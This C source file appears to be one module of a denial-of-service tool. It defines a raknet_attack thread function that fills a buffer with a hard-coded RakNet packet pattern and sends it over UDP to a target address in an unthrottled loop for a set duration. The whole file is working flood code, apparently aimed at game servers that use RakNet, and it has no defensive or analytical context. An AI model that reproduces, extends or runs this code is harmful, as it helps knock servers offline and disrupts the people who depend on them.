#define _GNU_SOURCE

#include "headers/raknet_attack.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

void* raknet_attack(void* arg) {
    attack_params* params = (attack_params*)arg;

    if (params->psize <= 0 || params->psize > 1492) {
        params->psize = 24; //default rsize for unconnected buffer
    }

    // RakNet payload
    unsigned char raknet_data[] = {
        0x02, // 0x01 works as well but server does not give timestamps (this is what i got told)
        0x01, 0x02, 0x4D, 0xFF, 0xFF, 0x00, 0x00, 0xDD,
        0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 
        0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };
    int pattern_len = sizeof(raknet_data);
    int packet_size = params->psize;
    if (packet_size < pattern_len) packet_size = pattern_len;
    unsigned char *packet = calloc(1, packet_size);
    if (!packet) {
        return NULL;
    }

    for (int i = 0; i < packet_size; i += pattern_len) {
        int copy_size = (packet_size - i) < pattern_len ? (packet_size - i) : pattern_len;
        memcpy(packet + i, raknet_data, copy_size);
    }

    int udp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udp_sock < 0) {
        free(packet);
        return NULL;
    }

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
    }

    free(packet);
    close(udp_sock);
    return NULL;
}
